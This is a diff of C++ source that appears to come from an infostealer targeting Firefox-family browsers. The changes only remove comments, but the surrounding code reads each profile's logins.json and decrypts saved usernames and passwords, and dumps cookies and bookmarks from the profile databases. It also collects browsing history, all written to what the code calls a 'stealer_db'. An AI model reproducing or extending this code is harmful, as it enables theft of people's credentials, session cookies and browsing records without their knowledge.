@@ -11,7 +11,7 @@ std::vector<std::string> browsers_gecko = {
 	"Mozilla\\icecat\\",
 	"Moonchild Productions\\Pale Moon\\",
 	"Comodo\\IceDragon\\",
-	"Waterfox\\", 
+	"Waterfox\\",
 	"Postbox\\",
 	"Flock\\Browser\\"
 };
@@ -28,18 +28,18 @@ BOOL gecko_parser(std::string username, std::string stealer_db)
 				for (const auto& entry : directory_iterator(target_user_data)) {
 					if (entry.is_directory() && exists(entry.path() / "logins.json")) {
 
-						// Read the JSON file
+
 						std::ifstream file(entry.path() / "logins.json");
 						if (!file.is_open()) {
 							std::cerr << "Failed to open file.\n";
 							return false;
 						}
 
-						// Parse the JSON
+
 						json data;
 						file >> data;
 
-						// Create decryptor object
+
 						GeckoDecryptor obj;
 						std::string program_dir = get_gecko_program_dir(entry.path().string());
 
@@ -47,17 +47,17 @@ BOOL gecko_parser(std::string username, std::string stealer_db)
 
 						if (!obj.set_profile_dir(entry.path().string())) { continue; }
 
-						// Loop through all logins
+
 						for (const auto& login : data["logins"]) {
 
 							DataHolder data;
 
-							// Extract fields for each login
+
 							std::string hostname = login["hostname"];
 							std::string username = login["encryptedUsername"];
 							std::string password = login["encryptedPassword"];
 
-							//data_array[data_index].setUrl(hostname);
+
 							data.get_password_manager().setUrl(hostname);
 
 							obj.decrypt_data(username, username);
@@ -74,11 +74,11 @@ BOOL gecko_parser(std::string username, std::string stealer_db)
 			}
 		}
 		catch (const std::filesystem::filesystem_error& e) {
-			//std::cerr << "Filesystem error: " << e.what() << '\n';
+
 			continue;
 		}
 		catch (const std::exception& e) {
-			//std::cerr << "General exception: " << e.what() << '\n';
+
 			continue;
 		}
 	}
@@ -105,7 +105,7 @@ BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 			if (exists(target_user_data) && is_directory(target_user_data)) {
 				for (const auto& entry : directory_iterator(target_user_data)) {
 					if (entry.is_directory() && exists(entry.path() / "cookies.sqlite")) {
-						//std::cout << entry.path() << '\n';
+
 
 						target_cookie_data = entry.path().string() + "\\cookies.sqlite";
 						sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT  host, name, path, value, expiry FROM moz_cookies");
@@ -134,7 +134,7 @@ BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 								data_list.push_back(data);
 							}
 							else {
-								// Handle the case where no data is fetched
+
 								continue;
 							}
 						}
@@ -143,11 +143,11 @@ BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 			}
 		}
 		catch (const std::filesystem::filesystem_error& e) {
-			//std::cerr << "Filesystem error: " << e.what() << '\n';
+
 			continue;
 		}
 		catch (const std::exception& e) {
-			//std::cerr << "General exception: " << e.what() << '\n';
+
 			continue;
 		}
 	}
@@ -165,7 +165,7 @@ std::string get_gecko_program_dir(std::string target_user_data)
 {
 	std::ifstream file(target_user_data + "\\compatibility.ini");
 	if (!file.is_open()) {
-		//std::cerr << "Could not open the file" << std::endl;
+
 		return "";
 	}
 
@@ -173,7 +173,7 @@ std::string get_gecko_program_dir(std::string target_user_data)
 	const std::string key = "LastPlatformDir=";
 	while (std::getline(file, line)) {
 		if (line.compare(0, key.size(), key) == 0) {
-			// Found the key, extract the value
+
 			return line.substr(key.size());
 		}
 	}
@@ -184,7 +184,7 @@ std::string get_gecko_program_dir(std::string target_user_data)
 
 BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 {
-	//This is actually Gecko History Collector
+
 	std::vector<DataHolder> data_list;
 
 	std::string target_user_data;
@@ -196,7 +196,7 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 			if (exists(target_user_data) && is_directory(target_user_data)) {
 				for (const auto& entry : directory_iterator(target_user_data)) {
 					if (entry.is_directory() && exists(entry.path() / "places.sqlite")) {
-						//std::cout << entry.path() << '\n';
+
 
 						target_bookmark_data = entry.path().string() + "\\places.sqlite";
 						sqlite3_stmt* stmt = query_database(target_bookmark_data, "SELECT  fk, title, dateAdded FROM moz_bookmarks");
@@ -218,7 +218,7 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 								if ((strlen(fk) == 0) || (strlen(title) == 0))
 									continue;
 
-								//Get URL using the foreign key from urls table
+
 								const char *str1 = "SELECT url FROM moz_places WHERE id = ";
 								int totalLength = strlen(str1) + strlen(fk) + 1;
 								char* query = (char*)malloc(totalLength);
@@ -227,7 +227,7 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 									continue;
 								}
 
-								// Use snprintf for safer string concatenation
+
 								snprintf(query, totalLength, "%s%s", str1, fk);
 
 								sqlite3_stmt* stmt2 = query_database(target_bookmark_data, query);
@@ -252,7 +252,7 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 								data_list.push_back(data);
 							}
 							else {
-								// Handle the case where no data is fetched
+
 								continue;
 							}
 						}
@@ -261,11 +261,11 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 			}
 		}
 		catch (const std::filesystem::filesystem_error& e) {
-			//std::cerr << "Filesystem error: " << e.what() << '\n';
+
 			continue;
 		}
 		catch (const std::exception& e) {
-			//std::cerr << "General exception: " << e.what() << '\n';
+
 			continue;
 		}
 	}
@@ -281,7 +281,7 @@ BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
 
 BOOL gecko_history_collector(std::string username, std::string stealer_db)
 {
-	//This is actually Gecko History Collector
+
 	std::vector<DataHolder> data_list;
 
 	std::string target_user_data;
@@ -293,7 +293,7 @@ BOOL gecko_history_collector(std::string username, std::string stealer_db)
 			if (exists(target_user_data) && is_directory(target_user_data)) {
 				for (const auto& entry : directory_iterator(target_user_data)) {
 					if (entry.is_directory() && exists(entry.path() / "places.sqlite")) {
-						//std::cout << entry.path() << '\n';
+
 
 						target_history_data = entry.path().string() + "\\places.sqlite";
 						sqlite3_stmt* stmt = query_database(target_history_data, "SELECT  url, title, visit_count, last_visit_date FROM moz_places");
@@ -321,7 +321,7 @@ BOOL gecko_history_collector(std::string username, std::string stealer_db)
 								data_list.push_back(data);
 							}
 							else {
-								// Handle the case where no data is fetched
+
 								continue;
 							}
 						}
@@ -330,11 +330,11 @@ BOOL gecko_history_collector(std::string username, std::string stealer_db)
 			}
 		}
 		catch (const std::filesystem::filesystem_error& e) {
-			//std::cerr << "Filesystem error: " << e.what() << '\n';
+
 			continue;
 		}
 		catch (const std::exception& e) {
-			//std::cerr << "General exception: " << e.what() << '\n';
+
 			continue;
 		}
 	}
